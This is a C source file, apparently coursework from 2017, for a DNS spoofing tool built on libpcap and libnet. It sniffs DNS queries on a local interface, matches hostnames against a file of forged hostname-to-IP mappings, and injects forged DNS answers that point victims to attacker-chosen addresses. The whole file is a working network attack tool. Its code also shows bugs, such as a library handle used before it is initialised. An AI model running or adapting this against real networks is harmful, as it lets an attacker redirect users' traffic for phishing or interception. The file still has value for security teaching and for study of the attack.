//
// Created by Mahima Parashar on 12/8/17.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
//#include <netinet/ether.h>
#include <libnet.h>
#include <resolv.h>
#include <stdint.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/sockio.h>
#include <sys/ioctl.h>

#define _CONSTANTS


#define SNAP_LEN 1518

#define SIZE_ETHERNET 14

#define MAX_FORGED_HOSTNAMES 100
#define IP_MAX_LENGTH 16
#define MAX_HOSTNAME_LENGTH 128

#define DNS_RESPONSES_MAX 1000
#define MAX_ANSWER_RECORDED 20

struct dnshdr{
    uint16_t id;             /* DNS packet ID */
    uint16_t flags;          /* DNS flags */
    uint16_t num_q;          /* Number of questions */
    uint16_t num_answ_rr;    /* Number of answer resource records */
    uint16_t num_auth_rr;    /* Number of authority resource records */
    uint16_t num_addi_rr;    /* Number of additional resource records */
};

struct sniff_ip {
    u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
    u_char  ip_tos;                 /* type of service */
    u_short ip_len;                 /* total length */
    u_short ip_id;                  /* identification */
    u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
    u_char  ip_ttl;                 /* time to live */
    u_char  ip_p;                   /* protocol */
    u_short ip_sum;                 /* checksum */
    struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

struct udphdr {
//    u_int16_t uh_sport;  /* source port */
//    u_int16_t uh_dport;  /* destination port */
//    u_int16_t uh_ulen;   /* udp length */
//    u_int16_t uh_sum;    /* udp checksum */
    unsigned short 	source;
    unsigned short 	dest;
    unsigned short 	len;
    unsigned short 	check;
    u_short 	uh_sport;
    u_short 	uh_dport;
    short 	uh_ulen;
    u_short 	uh_sum;
};
u_char response_payload[512];


int f = 0;
char ips[MAX_FORGED_HOSTNAMES][IP_MAX_LENGTH]; // spoofed/fake IPs in the hostNames file
char hostNames[MAX_FORGED_HOSTNAMES][MAX_HOSTNAME_LENGTH]; // hostnames to be mapped to spoofed/fake IPs
char *interface = NULL; // interface to be captured

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void readFile(char *hostNamesFile);
void spoofAnswer(char *dnsPayload, int dnsPayloadSize, u_long rData);

void readFile(char *hostNamesFile){
    FILE *filePtr = fopen(hostNamesFile, "r");
    if (filePtr == NULL) {
        printf("Error in opening the hostNames file !!!\n");
        f = -1;
        return;
    }

    f = 0;
    while(!feof(filePtr)){
        fscanf(filePtr, "%s", ips[f]);
        fscanf(filePtr, "%s", hostNames[f]);

        f++;
    }

}

void packetHandler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
//    printf("%s\n", interface);

    struct sniff_ip *ip;
    struct udphdr *udp;            /* The UDP header */
    u_char *payload;               /* Packet payload */
    int size_payload;
    int size_ip = LIBNET_IPV4_H;
    ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
    udp = (struct udphdr*)(packet + SIZE_ETHERNET + size_ip);
    uint16_t dest = ntohs(udp->dest);
    libnet_ptag_t dnstag = 0;
    libnet_ptag_t iptag = 0;
    libnet_ptag_t udptag = 0;
    libnet_t *handler;
    char ipaddr[IP_MAX_LENGTH];


    if (ip->ip_p != IPPROTO_UDP) {
        return;
    }
//    payload = (u_char *)(packet + SIZE_ETHERNET_HEADER + size_ip + size_udp);
//    size_payload = len - (size_ip + size_udp);

    if (dest != 53) {
        return;
    }

//  struct dns_header* dnsHeader = (struct dns_header*)(payload);
    struct dnshdr *dns = (struct dnshdr*)(packet + SIZE_ETHERNET + LIBNET_IPV4_H + LIBNET_UDP_H);

    char *dnsPayload;
    dnsPayload = (char *) (packet + SIZE_ETHERNET + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);
    int dnsPayloadSize = strlen(dnsPayload);
    char hostName[MAX_HOSTNAME_LENGTH];
    char *dnsPayload_bckup = dnsPayload;
    memset(hostName, '\0', sizeof(hostName));

    if (dn_expand((u_char*)dns, (u_char*)(packet + (int)(header->caplen)), dnsPayload, hostName, sizeof(hostName)) < 0) {
        printf("Error in compressing domain name.\n");
        return;
    }

    dnsPayload = dnsPayload_bckup;
    hostName[dnsPayloadSize-1]='\0';

    char tempHostName[MAX_HOSTNAME_LENGTH];
    strcpy(tempHostName, hostName);


    int index;
    if (f > 0) {
        for (index = 0; index < f; index++) {
            if (strcmp(hostNames[index], tempHostName) == 0) {
                break;
            }
        }
        if (index == f) {
            f = 0;
            return;
        }
    }

    if (f == 0) {
        int fd;
        struct ifreq ifr;

        fd = socket(AF_INET, SOCK_DGRAM, 0);

        ifr.ifr_addr.sa_family = AF_INET;

        strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
        printf("%s\n", interface);

        ioctl(fd, SIOCGIFADDR, &ifr);
        close(fd);
        strcpy(ipaddr, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    }
    else {
        strcpy(ipaddr, ips[index]);
    }



    u_long rData = libnet_name2addr4(handler, ipaddr, LIBNET_DONT_RESOLVE);
    if (rData == -1) {
        printf("Name Resolve failed: %s.\n", libnet_geterror(handler));
        return;
    }

    spoofAnswer(dnsPayload, dnsPayloadSize, rData);


    int dnsResponsePayloadSize = dnsPayloadSize + 21;

    int packetSize = LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H + dnsResponsePayloadSize;

    char errbuf_libnet[LIBNET_ERRBUF_SIZE];
    handler = libnet_init(LIBNET_RAW4, interface, errbuf_libnet);
    if (handler == NULL) {
        printf("Failure: libnet_init: %s.\n", errbuf_libnet);
    }


    dnstag = libnet_build_dnsv4(
            LIBNET_DNS_H, ntohs((short) dns->id),0x8580, 1, 1, 0, 0, response_payload, dnsResponsePayloadSize, handler, dnstag);

    if (dnstag == -1) {
        printf("Failure: Building DNS header: %s.\n", libnet_geterror(handler));
        return;
    }


    udptag = libnet_build_udp(ntohs((u_short) udp->dest), ntohs((u_short) udp->source), packetSize - LIBNET_IPV4_H, 0, NULL, 0, handler, udptag);

    if (udptag == -1) {
        printf("Failure: Building UDP header failed: %s\n", libnet_geterror(handler));
        return;
    }


    iptag = libnet_build_ipv4(packetSize, 0, 8964, 0, 64, IPPROTO_UDP, 0, (u_long) ip->ip_dst.s_addr, (u_long) ip->ip_src.s_addr, NULL, 0, handler, iptag);

    if (iptag == -1) {
        printf("Failure: Building IP header: %s\n", libnet_geterror(handler));
        return;
    }


    if (libnet_write(handler) == -1) {
        printf("Write failed: %s\n", libnet_geterror(handler));
        return;
    }

}


void spoofAnswer(char *dnsPayload, int dnsPayloadSize, u_long rData){
    memset(response_payload, 0, 512);
    memcpy(response_payload, dnsPayload, dnsPayloadSize + 5);
    memcpy(response_payload + dnsPayloadSize + 5,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x04\x00\x04", 12);
    *((u_long *)(response_payload + dnsPayloadSize+17)) = rData;
}

int main(int argc, char *argv[]){
    bpf_u_int32 mask;			// The netmask of our sniffing device
    bpf_u_int32 ip;				// The IP of our sniffing device
    struct bpf_program fp;		// The compiled filter expression
    int numPackets = 0;		// How many packets to sniff for


    char* file = NULL;
    char* str = NULL;
    char* expression = NULL;

    opterr = 0;
    char c;
    //parse arguments
    while ((c = getopt(argc, argv, "i:h:")) != -1) {
        switch(c) {
            case 'i':
                interface = optarg;
                if (optarg == NULL){
                    printf("Error in reading i argument.\n");}
                break;
            case 'h':
                if (optarg == NULL)
                    printf("Error in reading h argument.\n");
                file = optarg;
                break;
            default:
                printf("Default case.\n");
                break;
        }
    }

    if (optind < argc) {
        expression = argv[optind];
    }


    char *dev = NULL, errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

    if(interface != NULL){
        dev = interface;
    }
    else
    {
        dev = pcap_lookupdev(errbuf);
        interface = dev;
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            return(1);
        }

    }

    printf("Device: %s\n", dev);


    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Error::Couldn't open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    if (expression != NULL) {
        if (pcap_lookupnet(dev, &ip, &mask, errbuf) == -1) {
            fprintf(stderr, "Can't get netmask for device %s\n", dev);
            return(1);
        }
        if (pcap_compile(handle, &fp, expression, 0, ip) == -1) {
            fprintf(stderr, "Couldn't parse filter %s: %s\n", expression, pcap_geterr(handle));
            return(1);
        }
        if (pcap_setfilter(handle, &fp) == -1) {
            fprintf(stderr, "Couldn't install filter %s: %s\n", expression, pcap_geterr(handle));
            return(1);
        }
    }

    if (file != NULL) {
        readFile(file);
    }

    printf("%s\n", interface);
    pcap_loop(handle, 0, packetHandler, NULL);
    pcap_close(handle);
    return 0;
}